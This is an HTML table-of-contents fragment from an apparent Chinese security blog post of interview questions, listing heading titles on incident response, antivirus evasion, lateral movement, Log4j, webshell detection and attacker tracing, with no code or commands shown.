class="toc-text">Linux系统排查</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text">系统排查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5-2"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">Windows系统排查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%8E%92%E6%9F%A5"><span class="toc-number">1.3.3.1.1.</span> <span class="toc-text">用户信息排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E3%80%81%E6%9C%8D%E5%8A%A1%E3%80%81%E9%A9%B1%E5%8A%A8%E3%80%81%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8E%92%E6%9F%A5"><span class="toc-number">1.3.3.1.2.</span> <span class="toc-text">进程、服务、驱动、启动项排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E6%8E%92%E6%9F%A5"><span class="toc-number">1.3.3.1.3.</span> <span class="toc-text">网络连接排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E6%8E%92%E6%9F%A5"><span class="toc-number">1.3.3.1.4.</span> <span class="toc-text">任务计划排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8E%92%E6%9F%A5"><span class="toc-number">1.3.3.1.5.</span> <span class="toc-text">文件排查</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linux%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">linux系统排查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B4%A6%E6%88%B7%E6%8E%92%E6%9F%A5"><span class="toc-number">1.3.3.2.1.</span> <span class="toc-text">账户排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5"><span class="toc-number">1.3.3.2.2.</span> <span class="toc-text">入侵排查</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">历史命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-bash-history%E6%9F%A5%E7%9C%8B%E5%B8%90%E5%8F%B7%E6%89%A7%E8%A1%8C%E8%BF%87%E7%9A%84%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.3.3.1.</span> <span class="toc-text">通过.bash_history查看帐号执行过的系统命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.3.3.4.</span> <span class="toc-text">检查异常端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.3.3.5.</span> <span class="toc-text">检查异常进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">1.3.3.6.</span> <span class="toc-text">检查开机启动项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.3.3.7.</span> <span class="toc-text">检查定时任务</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.3.7.1.</span> <span class="toc-text">基本命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5-2"><span class="toc-number">1.3.3.7.2.</span> <span class="toc-text">入侵排查</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.3.3.8.</span> <span class="toc-text">检查服务</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5-3"><span class="toc-number">1.3.3.8.1.</span> <span class="toc-text">入侵排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="toc-number">1.3.3.8.2.</span> <span class="toc-text">服务器自启动</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.3.9.</span> <span class="toc-text">检查异常文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97"><span class="toc-number">1.3.3.10.</span> <span class="toc-text">检查系统日志</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E6%96%87%E4%BB%B6-%E6%89%BE-php%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.3.11.</span> <span class="toc-text">检查异常文件,找.php后缀文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97-2"><span class="toc-number">1.3.3.12.</span> <span class="toc-text">检查系统日志</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E4%BA%86%E8%A7%A3%E8%BF%87%E5%A4%9A%E5%B0%91"><span class="toc-number">1.4.</span> <span class="toc-text">免杀了解过多少</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%E5%85%8D%E6%9D%80"><span class="toc-number">1.4.1.</span> <span class="toc-text">powershell免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">免杀方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97%E6%8B%86%E5%88%86%E8%BF%9B%E8%A1%8Cbypass"><span class="toc-number">1.4.1.1.1.</span> <span class="toc-text">使用关键字拆分进行bypass</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Fuzz%E6%80%9D%E6%83%B3%E8%BF%9B%E8%A1%8Cbypass"><span class="toc-number">1.4.1.1.2.</span> <span class="toc-text">Fuzz思想进行bypass</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B6%85%E9%95%BF%E5%91%BD%E4%BB%A4bypass"><span class="toc-number">1.4.1.1.3.</span> <span class="toc-text">超长命令bypass</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8copy%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8Cbypass"><span class="toc-number">1.4.1.1.4.</span> <span class="toc-text">使用copy命令进行bypass</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B7%B7%E5%90%88bypass"><span class="toc-number">1.4.1.1.5.</span> <span class="toc-text">混合bypass</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E6%AD%BB%E9%A9%AC%E6%9F%A5%E6%9D%80"><span class="toc-number">1.5.</span> <span class="toc-text">不死马查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#root%E7%94%A8%E6%88%B7%E8%A7%92%E5%BA%A6%E7%9A%84%E6%9F%A5%E6%9D%80"><span class="toc-number">1.5.1.</span> <span class="toc-text">root用户角度的查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%80%E6%8E%89%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">杀掉进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E7%9A%84%E6%9F%A5%E6%9D%80"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">其他用户的查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%80%E6%8E%89%E8%BF%9B%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.5.1.2.1.</span> <span class="toc-text">杀掉进程：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.5.1.2.2.</span> <span class="toc-text">条件竞争:</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.6.</span> <span class="toc-text">域内横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%B8%B8%E7%94%A8%E7%9A%84windows%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E5%92%8C%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="toc-number">1.6.1.</span> <span class="toc-text">0x01 常用的windows远程连接和相关命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-Windoors%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">0x02 Windoors系统散列值获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">1.6.1.2.</span> <span class="toc-text">0x03 哈希传递攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92"><span class="toc-number">1.6.1.3.</span> <span class="toc-text">0x04票据传递</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Log4J%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.7.</span> <span class="toc-text">Log4J漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j%E7%AE%80%E4%BB%8B"><span class="toc-number">1.7.1.</span> <span class="toc-text">Log4j简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j%E7%9A%84lookup%E5%8A%9F%E8%83%BD"><span class="toc-number">1.7.2.</span> <span class="toc-text">Log4j的lookup功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.7.3.</span> <span class="toc-text">Log4j 漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80"><span class="toc-number">1.8.</span> <span class="toc-text">java内存马查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%89%B9%E5%BE%81%E7%9A%84%E8%AF%86%E5%88%AB"><span class="toc-number">1.8.1.</span> <span class="toc-text">内存马特征的识别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#filter%E7%89%B9%E6%AE%8A%E5%90%8D%E7%A7%B0"><span class="toc-number">1.8.1.1.</span> <span class="toc-text">filter特殊名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#filter%E4%BC%98%E5%85%88%E7%BA%A7"><span class="toc-number">1.8.1.2.</span> <span class="toc-text">filter优先级</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-xml%E4%B8%AD%E6%B2%A1%E6%9C%89filter%E9%85%8D%E7%BD%AE"><span class="toc-number">1.8.1.3.</span> <span class="toc-text">web.xml中没有filter配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8Aclassloader%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.8.1.4.</span> <span class="toc-text">特殊classloader加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Filter%E7%9A%84doFilter%E6%96%B9%E6%B3%95%E4%B8%AD%E6%9C%89%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">1.8.1.5.</span> <span class="toc-text">Filter的doFilter方法中有恶意代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E5%A4%A7%E7%B1%BB"><span class="toc-number">1.8.2.</span> <span class="toc-text">三大类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E7%AE%80%E8%BF%B0"><span class="toc-number">1.8.3.</span> <span class="toc-text">原理简述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#servlet-api%E7%B1%BB"><span class="toc-number">1.8.3.1.</span> <span class="toc-text">servlet-api类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Java-agent%E7%B1%BB"><span class="toc-number">1.8.3.2.</span> <span class="toc-text">Java-agent类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.9.</span> <span class="toc-text">各种数据库的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap%E6%80%8E%E4%B9%88%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-number">1.10.</span> <span class="toc-text">sqlmap怎么看当前用户权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap%E6%80%8E%E4%B9%88%E9%9A%90%E8%97%8Fip%E6%89%AB%E6%8F%8F"><span class="toc-number">1.11.</span> <span class="toc-text">nmap怎么隐藏ip扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E8%BF%87SRC%E5%90%97"><span class="toc-number">1.12.</span> <span class="toc-text">挖过SRC吗?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%B9%E7%BC%98%E8%B5%84%E4%BA%A7%E5%A6%82%E4%BD%95%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.13.</span> <span class="toc-text">边缘资产如何探测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86"><span class="toc-number">1.13.1.</span> <span class="toc-text">子域名收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.13.1.1.</span> <span class="toc-text">搜索引擎查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E6%9F%A5%E8%AF%A2%E6%8E%A5%E5%8F%A3"><span class="toc-number">1.13.1.2.</span> <span class="toc-text">在线查询接口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9A%B4%E5%8A%9B%E7%8C%9C%E8%A7%A3"><span class="toc-number">1.13.1.3.</span> <span class="toc-text">子域名暴力猜解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS%E6%9F%A5%E8%AF%A2-%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.13.1.4.</span> <span class="toc-text">DNS查询&#x2F;枚举</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTPS%E8%AF%81%E4%B9%A6"><span class="toc-number">1.13.1.5.</span> <span class="toc-text">HTTPS证书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E6%90%9C%E7%B4%A2"><span class="toc-number">1.13.1.6.</span> <span class="toc-text">综合搜索</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%AD%9B%E9%80%89"><span class="toc-number">1.13.1.7.</span> <span class="toc-text">子域名筛选</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86"><span class="toc-number">1.13.1.8.</span> <span class="toc-text">相关域名收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%81%E7%AB%99%E5%8F%8Ac%E6%AE%B5%E6%94%B6%E9%9B%86"><span class="toc-number">1.13.1.8.1.</span> <span class="toc-text">旁站及c段收集</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.13.1.8.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BB%E7%AB%99%E6%8F%90%E5%8F%96"><span class="toc-number">1.13.1.8.3.</span> <span class="toc-text">主站提取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A7%BB%E5%8A%A8%E7%AB%AF"><span class="toc-number">1.13.1.8.4.</span> <span class="toc-text">移动端</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A1%8C%E4%B8%9A%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.13.1.8.5.</span> <span class="toc-text">行业系统</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thinkphp-%E6%A1%86%E6%9E%B6%E5%90%84%E7%A7%8D%E7%89%88%E6%9C%AC%E6%9C%89%E4%BB%80%E4%B9%88%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.14.</span> <span class="toc-text">thinkphp 框架各种版本有什么漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5%E5%87%BA%E6%9D%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-%E6%B2%A1%E6%9C%89%E6%97%A5%E5%BF%97%E6%80%8E%E4%B9%88%E6%89%BE"><span class="toc-number">1.15.</span> <span class="toc-text">排查出来一句话木马,没有日志怎么找</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95"><span class="toc-number">1.15.1.</span> <span class="toc-text">检查网站目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8PHP%E7%9A%84-%E5%8A%9F%E8%83%BD"><span class="toc-number">1.15.2.</span> <span class="toc-text">利用PHP的 功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F"><span class="toc-number">1.15.3.</span> <span class="toc-text">检查网络流量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%AB%E4%BA%BA%E5%B7%B2%E7%BB%8F%E5%B0%86%E6%9C%A8%E9%A9%AC%E4%BC%A0%E5%88%B0%E4%B8%BB%E6%9C%BA%E6%97%B6-%E6%80%8E%E4%B9%88%E6%8E%92%E6%9F%A5"><span class="toc-number">1.16.</span> <span class="toc-text">别人已经将木马传到主机时,怎么排查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%BA%AF%E6%BA%90"><span class="toc-number">1.17.</span> <span class="toc-text">如何溯源</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%E4%B8%80"><span class="toc-number">1.17.1.</span> <span class="toc-text">答案一:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%E4%BA%8C"><span class="toc-number">1.17.2.</span> <span class="toc-text">答案二</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-ip-%E6%BA%AF%E6%BA%90%E4%B8%80%E4%BA%8C"><span class="toc-number">1.17.2.1.</span> <span class="toc-text">针对 ip 溯源一二</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A5%E8%87%AA%E5%88%9B%E5%AE%87%E7%9B%BE%E7%AD%89%E8%8A%82%E7%82%B9%E7%9A%84%E6%B5%81%E9%87%8F-ip"><span class="toc-number">1.17.2.2.</span> <span class="toc-text">来自创宇盾等节点的流量 ip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#whois-%E5%9F%9F%E5%90%8D%E5%8F%8D%E6%9F%A5"><span class="toc-number">1.17.2.3.</span> <span class="toc-text">whois 域名反查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3-%E6%9C%8D%E5%8A%A1-%E8%BF%9B%E8%A1%8C%E5%8F%8D%E6%B8%97%E9%80%8F"><span class="toc-number">1.17.2.4.</span> <span class="toc-text">探测端口 服务 进行反渗透</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5"><span class="toc-number">1.17.2.5.</span> <span class="toc-text">威胁情报</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%82%AE%E7%AE%B1-qq-%E6%89%8B%E6%9C%BA%E5%8F%B7-%E7%A4%BE%E5%B7%A5%E5%BA%93"><span class="toc-number">1.17.2.6.</span> <span class="toc-text">邮箱 qq 手机号 社工库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#qq-%E5%BE%AE%E4%BF%A1-%E6%8A%96%E9%9F%B3-%E9%99%8C%E9%99%8C-%E7%AD%89%E6%8E%A5%E5%8F%A3"><span class="toc-number">1.17.2.7.</span> <span class="toc-text">qq 微信 抖音 陌陌 等接口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ga-%E6%95%B0%E6%8D%AE-%E8%BF%90%E8%90%A5%E5%95%86%E6%95%B0%E6%8D%AE"><span class="toc-number">1.17.2.8.</span> <span class="toc-text">ga 数据 运营商数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%E4%B8%89"><span class="toc-number">1.17.3.</span> <span class="toc-text">答案三</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ida%E5%A6%82%E4%BD%95%E6%B8%97%E9%80%8F%E5%B0%8F%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.18.</span> <span class="toc-text">ida如何渗透小程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E5%BE%97%E5%88%B0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E5%90%8E%E5%A6%82%E4%BD%95%E6%89%A9%E5%A4%A7%E6%88%98%E6%9E%9C"><span class="toc-number">1.19.</span> <span class="toc-text">MySQL得到管理员权限后如何扩大战果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%94%A8%E8%BF%87%E5%90%97"><span class="toc-number">1.20.</span> <span class="toc-text">网络空间搜索引擎用过吗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FOFA"><span class="toc-number">1.20.1.</span> <span class="toc-text">FOFA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#360Quake"><span class="toc-number">1.20.2.</span> <span class="toc-text">360Quake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shodan"><span class="toc-number">1.20.3.</span> <span class="toc-text">Shodan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Zoomeye"><span class="toc-number">1.20.4.</span> <span class="toc-text">Zoomeye</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E7%94%A8%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E9%85%8D%E5%90%88xss%E6%94%BB%E5%87%BB%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90"><span class="toc-number">1.21.</span> <span class="toc-text">怎么用渗透工具配合xss攻击获取服务器权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E8%AE%BE%E5%A4%87%E5%92%8C%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5%E8%AE%BE%E5%A4%87%E5%8F%91%E7%94%9F%E6%8A%A5%E8%AD%A6%EF%BC%8C%E5%AF%B9%E8%AD%A6%E5%91%8A%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%EF%BC%8C%E8%AE%B2%E4%B8%80%E4%B8%8B%E4%BD%A0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%8A%E6%9C%BA%E6%8E%92%E6%9F%A5%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">1.22.</span> <span class="toc-text">流量检测设备和态势感知设备发生报警，对警告进行分析，讲一下你流量分析和上机排查的思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5%E4%B8%80%E4%B8%8B%E6%98%AF%E5%90%A6%E6%98%AF%E8%AF%AF%E6%8A%A5"><span class="toc-number">1.22.1.</span> <span class="toc-text">排查一下是否是误报</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5%E4%B8%BB%E6%9C%BA%E4%B8%8A%E9%9D%A2%E6%98%AF%E5%90%A6%E6%9C%89%E5%85%B6%E4%BB%96%E7%9A%84%E5%91%8A%E8%AD%A6%E6%83%85%E5%86%B5"><span class="toc-number">1.22.2.</span> <span class="toc-text">排查主机上面是否有其他的告警情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E6%9C%BA%E6%8E%92%E6%9F%A5"><span class="toc-number">1.22.3.</span> <span class="toc-text">上机排查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ip%E4%BB%A3%E7%90%86%E5%A6%82%E4%BD%95%E6%8E%92%E6%9F%A5"><span class="toc-number">1.23.</span> <span class="toc-text">ip代理如何排查</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/%E8%93%9D%E9%98%9F/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E8%93%9D%E9%98%9F-windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="蓝队"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蓝队"/></a><div class="content"><a class="title" href="/%E8%93%9D%E9%98%9F/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E8%93%9D%E9%98%9F-windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="蓝队">蓝队</a><time datetime="2023-04-10T10:28:42.094Z" title="发表于 2023-04-10 18:28:42">2023-04-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E6%B8%97%E9%80%8F/CS/%E8%BF%9B%E9%98%B6/CS-%E6%B8%97%E9%80%8F/" title="CS-渗透"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CS-渗透"/></a><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/CS/%E8%BF%9B%E9%98%B6/CS-%E6%B8%97%E9%80%8F/" title="CS-渗透">CS-渗透</a><time datetime="2023-04-10T10:28:42.093Z" title="发表于 2023-04-10 18:28:42">2023-04-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E6%B8%97%E9%80%8F/CS/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/CS%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E6%94%BB%E5%87%BB/" title="CS邮件钓鱼攻击"><img 